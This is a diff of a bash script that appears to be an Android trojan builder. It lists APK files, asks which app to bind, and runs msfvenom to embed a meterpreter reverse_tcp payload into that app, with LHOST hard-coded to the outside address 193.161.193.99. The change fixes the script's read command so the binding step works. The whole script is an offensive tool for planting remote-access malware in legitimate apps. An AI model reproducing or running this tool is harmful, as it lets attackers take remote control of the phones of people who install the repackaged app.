@@ -131,7 +131,7 @@ echo -e "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} List of apps   PWD
 ls $PWD|grep apk|sed 's#^#\t[+] #g'
 
 echo -en "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} App U want to bind: ${IYellow}"
-read $app
+read app
 
 echo -en "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Enter output app n: ${IYellow}"
 read op
@@ -141,6 +141,8 @@ echo -e "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Please wait... "
 sleep 3
 
 msfvenom -x $app -p android/meterpreter/reverse_tcp LHOST=193.161.193.99 LPORT=$lport -o $op
+
+
 
 echo -e "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Payload generated... "
 echo -e "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Starting please wait... "
